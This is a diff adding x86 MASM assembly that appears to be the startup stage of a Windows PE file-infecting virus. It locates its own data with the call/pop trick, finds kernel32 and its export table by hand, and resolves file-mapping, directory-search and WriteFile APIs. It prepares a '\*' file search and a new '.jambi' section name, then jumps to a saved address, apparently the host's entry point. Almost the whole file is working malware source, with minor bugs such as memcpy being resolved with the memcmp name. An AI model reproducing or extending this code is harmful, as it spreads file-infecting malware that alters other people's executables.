@@ -1,0 +1,597 @@
+;; GetProcAddress	15
+;; LoadLibraryExA	15
+;; CreateFileA	12
+;; CreateFileMappingA 19
+;; ExitProcess 12
+;; FindFirstFileA 15
+;; GetCurrentDirectoryA 21
+;; lstrcatA 9
+;; MapViewOfFile 14
+;; SetFilePointer 15
+;; UnmapViewOfFile 16
+;; WriteFile 10
+;; User32 7
+;; MessageBoxA 12
+;; msvcrt 7
+;; memcmp 7
+;; memcpy 7
+;; printf 7
+;; strcpy 7
+;; strncmp 8
+;; Shlwapi 8
+;; StrDupA 8
+;; CloseHandle 12
+;; FindNextFileA 14
+; .386
+; .model		flat, stdcall
+; option		casemap:none
+
+; include		c:\masm32\include\windows.inc
+
+; include		c:\masm32\include\kernel32.inc
+; include		c:\masm32\include\user32.inc
+; include		c:\masm32\include\msvcrt.inc
+
+; includelib	c:\masm32\lib\kernel32.lib
+; includelib	c:\masm32\lib\user32.lib
+; includelib	c:\masm32\lib\msvcrt.lib
+
+include		funcs.asm
+
+;.data
+; pattern		db	"address of Kernel32.dll  => %p", 13, 10, 0
+; pattern2	db	"address of GetProcAddr => %p", 13, 10, 0
+; pattern3	db	"address of LoaLibraryExA => %p", 13, 10, 0
+; pattern4	db	"address of ExPortTable => %p", 13, 10, 0
+; patternptr	db	"address of ptr => %p", 13, 10, 0
+; patternMsgBox	db	"address of msgbox => %p", 13, 10, 0
+; patternregister	db	"value of register => %d", 13, 10, 0
+; patternuser32	db	"address user32 => %p", 13, 10, 0
+; patternzomg	db	"zoh my gaude", 13, 10, 0
+
+.code
+; zomg:
+
+; invoke	crt_printf, offset patternzomg
+; invoke	GetLastError
+;invoke	crt_printf, offset patternregister, eax
+; invoke ExitProcess, 0
+
+;; push 45
+;; call rand
+
+peb:
+jmp @@my_vars
+peb2:
+	pop	ebx
+	mov	[ebp - 400], ebx
+	;sub	esp, 512
+	;---------------------------------------------------------------------------------
+	; EBP
+	;---------------------------------------------------------------------------------
+	; HANDLE				200	Kernel32.dll
+	; HANDLE				204	Kernel32 exportTable
+	; HANDLE 				208	LoadLibraryA
+	; HANDLE				212	GetProcAddr
+	;---------------------------------------------------------------------------------
+        ; DLLS
+	;---------------------------------------------------------------------------------
+	; HANDLE				216	User32
+	; HANDLE				220	msvcrt.dll
+	; HANDLE				224	Shlwapi.dll
+	;---------------------------------------------------------------------------------
+	; Kernel32 Functions
+	;---------------------------------------------------------------------------------
+	; HANDLE				228	CreateFileA
+	; HANDLE				232	CreateFileMappingA
+	; HANDLE				236	ExitProcess
+	; HANDLE				240	FindFirstFileExA (cancer)
+	; HANDLE				244	GetCurrentDirectoryA (cancer)
+	; HANDLE				248	strcat (from msvcrt.dll)
+	; HANDLE				252	MapViewOfFile
+	; HANDLE				256	SetFilePointer
+	; HANDLE				260	UnmapViewOfFile
+	; HANDLE				264	WriteFile
+	;---------------------------------------------------------------------------------
+	; User32 Functions
+	;---------------------------------------------------------------------------------
+	; HANDLE				268	MessageBoxA
+	;---------------------------------------------------------------------------------
+	; msvcrt Functions
+	;---------------------------------------------------------------------------------
+	; HANDLE				272	memcmp
+	; HANDLE				276	memcpy
+	; HANDLE				280	printf
+	; HANDLE				284	strcpy
+	; HANDLE				288	strncmp
+	;---------------------------------------------------------------------------------
+	; Shlwapi.dll Functions
+	;---------------------------------------------------------------------------------
+	; HANDLE				292	StrDupA
+	;---------------------------------------------------------------------------------
+	; Kernel32.dll
+	;---------------------------------------------------------------------------------
+	; HANDLE				296	CloseHandle
+	; HANDLE				300	FindNextFile
+	;---------------------------------------------------------------------------------
+
+mov	eax, [ebp - 400]
+
+;; GetProcAddress
+add	eax, 15
+mov	[ebp - 404], eax
+
+;; LoadLibraryExA
+add	eax, 15
+mov	[ebp - 408], eax
+
+;; CreateFileA
+add	eax, 12
+mov	[ebp - 412], eax
+
+;; CreateFileMappingA
+add	eax, 19
+mov	[ebp - 416], eax
+
+;; ExitProcess
+add	eax, 12
+mov	[ebp - 420], eax
+
+;; FindFirstFileA
+add	eax, 15
+mov	[ebp - 424], eax
+
+;; GetCurrentDirectoryA
+add	eax, 21
+mov	[ebp - 428], eax
+
+;; lstrcatA
+add	eax, 9
+mov	[ebp - 432], eax
+
+;; MapViewOfFile
+add	eax, 14
+mov	[ebp - 436], eax
+
+;; SetFilePointer
+add	eax, 15
+mov	[ebp - 440], eax
+
+;; UnmapViewOfFile
+add	eax, 16
+mov	[ebp - 444], eax
+
+;; WriteFile
+add	eax, 10
+mov	[ebp - 448], eax
+
+;; User32
+add	eax, 7
+mov	[ebp - 452], eax
+
+;; effet de bord
+
+;; MessageBoxA
+add	eax, 12
+mov	[ebp - 468], eax
+
+;; msvcrt
+add	eax, 7
+mov	[ebp - 472], eax
+
+;; memcmp
+add	eax, 7
+mov	[ebp - 476], eax
+
+;; memcpy
+add	eax, 7
+mov	[ebp - 480], eax
+
+;; printf
+add	eax, 7
+mov	[ebp - 484], eax
+
+;; strcpy
+add	eax, 7
+mov	[ebp - 488], eax
+
+;; strncmp
+add	eax, 8
+mov	[ebp - 492], eax
+
+;; Shlwapi
+add	eax, 8
+mov	[ebp - 496], eax
+
+;; StrDupA
+add	eax, 8
+mov	[ebp - 500], eax
+
+;; CloseHandle
+add	eax, 12
+mov	[ebp - 504], eax
+
+;; FindNextFileA
+add	eax, 14
+mov	[ebp - 508], eax
+
+;; "\*"
+add	eax, 14
+mov	[ebp - 512], eax
+
+;; "~[popup'title]~"
+add	eax, 3
+mov	[ebp - 516], eax
+
+;; ".jambi"
+add	eax, 16
+mov	[ebp - 520], eax
+
+;; "addr: %p size: %d"
+add	eax, 7
+mov	[ebp - 524], eax
+
+;; "random [error/txt/affichage]"
+add	eax, 20
+mov	[ebp - 528], eax
+
+;; 8
+add	eax, 31
+mov	[ebp - 532], eax
+
+;; -------
+
+call	GetKernel32Address
+mov	[ebp - 200], eax					; saving &kernel32
+
+;; push	[ebp - 200]
+;; push	offset pattern
+;; call	crt_printf
+
+push	[ebp - 200]
+call	GetExportTableAddress
+mov	[ebp - 204], eax					; saving &exportTable
+;invoke	crt_printf, offset pattern4, eax
+
+;GetFuncAddr(&kernel32, &exportTable, "GetProcAddress")
+mov	eax, [ebp - 400]    ;; @@sGetProcAddress
+push	eax
+push	[ebp - 204]
+push	[ebp - 200]
+call	GetFuncAddr
+
+mov    [ebp - 212], eax						;saving GetProcAddr
+;invoke	crt_printf, offset pattern2, eax
+;GetFundAddr(&kernel32, &exportTable, "LoadLibraryExA")
+
+lea	eax, @@sLoadLibraryExA
+push	eax
+;; push	[ebp - 404]
+push	[ebp - 204]
+push	[ebp - 200]
+call	GetFuncAddr
+mov	[ebp - 208], eax
+
+; invoke	crt_printf, offset pattern3, eax
+
+;LoadLibraryExA("User32", 0, 0);
+push	0
+push	0
+push	@@sUser32
+mov	eax, [ebp - 208]
+call	eax
+mov	[ebp - 216], eax					;saving user32.dll
+
+or	eax, eax
+jz	_error14
+
+; invoke	crt_printf, offset patternuser32, eax
+
+;GetProcAddress(&User32, "MessageBoxA")
+push	@@sMessageBoxA
+push	[ebp - 216]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 268], eax					;saving MessageBoxA
+
+or	eax, eax
+jz	_error14
+
+;GetProcAddress(&kernel32, "CreateFileA")
+push	@@sCreateFileA
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 228], eax
+
+or	eax, eax
+jz	_error14
+
+;GetProcAddress(&kernel32, "CreateFileMappingA")
+push	@@sCreateFileMappingA
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 232], eax
+
+or	eax, eax
+jz	_error14
+
+;GetProcAddress(&kernel32, "ExitProcess")
+push	@@sExitProcess
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 236], eax
+
+or	eax, eax
+jz	_error14
+
+;[ebp-240] =GetProcAddress(&kernel32, "FindFirstFileA")
+push	@@sFindFirstFileA
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 240],eax
+
+or	eax, eax
+jz	_error14
+
+;[ebp-244] = GetProcAddress(&kernel32, "GetCurrentDirectoryA")
+push	@@sGetCurrentDirectoryA
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 244], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&kernel32, "MapViewOfFile")
+push	@@sMapViewOfFile
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 252], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&kernel32, "SetFilePointer")
+push	@@sSetFilePointer
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 256], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&User32, "UnmapViewOfFile")
+push	@@sUnmapViewOfFile
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 260], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&User32, "WriteFile")
+push	@@sWriteFile
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 264], eax
+
+or	eax, eax
+jz	_error14
+
+
+;LoadLibraryExA("msvcrt", 0, 0);
+push	0
+push	0
+push	@@smsvcrt
+mov	eax, [ebp - 208]
+call	eax
+mov	[ebp - 220], eax	;saving msvcrt.dll
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&msvcrt, memcmp)
+push	@@smemcmp
+push	[ebp - 220]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 272], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&msvcrt,memcpy)
+push	@@smemcmp
+push	[ebp - 220]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 276], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&msvcrt, printf)
+push	@@sprintf
+push	[ebp - 220]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 280], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&??, "strcat")
+push	@@sstrcat
+push	[ebp - 200]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 248], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&msvcrt, strcpy)
+push	@@sstrcpy
+push	[ebp - 220]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 284], eax
+
+or	eax, eax
+jz	_error14
+
+; GetProcAddress(&msvcrt, strncmp)
+push	@@sstrncmp
+push	[ebp - 220]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 288], eax
+
+or	eax, eax
+jz	_error14
+
+;LoadLibraryExA("Shlwapi", 0, 0);
+push	0
+push	0
+push	@@sShlwapi
+mov	eax, [ebp - 208]
+call	eax
+mov	[ebp - 224], eax					;saving Shlwapi.dll
+
+or eax, eax
+jz _error14
+
+; GetProcAddress(&msvcrt,StrDupA)
+push	@@sStrDupA
+push	[ebp - 224]
+mov	eax, [ebp - 212]
+call	eax
+mov	[ebp - 292], eax
+
+or	eax, eax
+jz	_error14
+
+; CloseHandle
+push 	@@sCloseHandle
+push	[ebp - 200]	 					;kernel32
+call	dword ptr [ebp - 212]					;GetProcAdress
+mov	[ebp - 296], eax
+
+or	eax, eax
+jz	_error14
+
+; FindNextFile
+push 	@@sFindNextFileA
+push	[ebp - 200]	 					;kernel32
+call	dword ptr [ebp - 212]					;GetProcAdress
+mov	[ebp - 300], eax
+
+or	eax, eax
+jz	_error14
+
+
+jmp	dword ptr [ebp - 196]
+
+
+@@my_vars:
+call peb2
+@@sGetProcAddress:
+db	"GetProcAddress", 0	; 0
+@@sLoadLibraryExA:
+db	"LoadLibraryExA", 0	; 15
+@@sCreateFileA:
+db	"CreateFileA", 0	; 30
+@@sCreateFileMappingA:
+db	"CreateFileMappingA", 0 ; 42
+@@sExitProcess:
+db	"ExitProcess", 0	; 61
+@@sFindFirstFileA:
+db	"FindFirstFileA", 0	; 73
+@@sGetCurrentDirectoryA:
+db	"GetCurrentDirectoryA", 0 ; 88
+@@sstrcat:
+db	"lstrcatA", 0 		; 109
+@@sMapViewOfFile:
+db	"MapViewOfFile", 0 	; 118
+@@sSetFilePointer:
+db	"SetFilePointer", 0 	; 134
+@@sUnmapViewOfFile:
+db	"UnmapViewOfFile", 0 	; 149
+@@sWriteFile:
+db	"WriteFile", 0 		; 165
+@@sUser32:
+db	"User32", 0 		; 175
+@@sMessageBoxA:
+db	"MessageBoxA", 0 	; 182
+@@smsvcrt:
+db	"msvcrt", 0 		; 194
+@@smemcmp:
+db	"memcmp", 0 		; 201
+@@smemcpy:
+db	"memcpy", 0 		; 208
+@@sprintf:
+db	"printf", 0 		; 215
+@@sstrcpy:
+db	"strcpy", 0		; 222
+@@sstrncmp:
+db	"strncmp", 0 		; 229
+@@sShlwapi:
+db	"Shlwapi", 0 		; 237
+@@sStrDupA:
+db	"StrDupA", 0 		; 245
+@@sCloseHandle:
+db	"CloseHandle", 0 	; 253
+@@sFindNextFileA:
+db	"FindNextFileA", 0 	; 265
+@@execpattern:
+db	"\*",0			; + 14
+@@szWndTitle:
+db	"~[popup'title]~", 0	; + 3
+@@sectionName:
+db	".jambi", 0		; + 16
+@@my_format:
+db	"addr: %p size: %d", 13, 10, 0 ; + 7
+@@loli:
+@@format_text:
+@@format_string:
+@@format_integer:
+@@format_pointer:
+@@format_short:
+@@format_char:
+@@binary_noop:
+@@pause_command:
+@@error_StrDup:
+@@error_CreateFile:
+@@error_CreateFileMapping:
+@@error_MapViewOfFile:
+@@error_PE_format:
+@@error_Invalid_Handle_Value:
+@@error_Invalid_Set_FP:
+@@error_Write_File:
+@@error_Close_Handle:
+@@error_Find_First_File:
+@@error_Find_Next_File:
+@@error_Stack_Overflow:
+@@pattern:
+@@pattern2:
+@@pattern3:
+@@pattern4:
+@@patternptr:
+@@patternMsgBox:
+@@patternregister:
+@@patternuser32:
+@@patternpebfail:
+db 'random [error/txt/affichage]', 13, 10, 0 ; + 20
+@@sectionNameLength:
+dword	8			; + 31
+
+@@my_sortie:
